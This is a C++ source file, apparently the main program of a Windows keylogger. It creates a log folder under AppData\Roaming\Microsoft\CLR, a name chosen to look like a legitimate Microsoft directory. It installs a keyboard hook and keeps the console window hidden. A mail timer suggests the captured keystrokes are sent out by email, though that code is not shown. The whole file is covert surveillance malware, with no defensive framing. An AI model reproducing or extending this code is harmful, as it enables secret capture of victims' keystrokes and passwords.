#include "../../x86_64-w64-mingw32/include/windows.h"
#include "IO.h"
#include "keyhook.h"

int main() {
    MSG Msg;

    // creates the log file at: C:\Users\[USERNAME]\AppData\Roaming\Microsoft\CLR
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();

    // this section prevents the console window from appearing
    while (GetMessage(&Msg, nullptr, 0, 0)) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
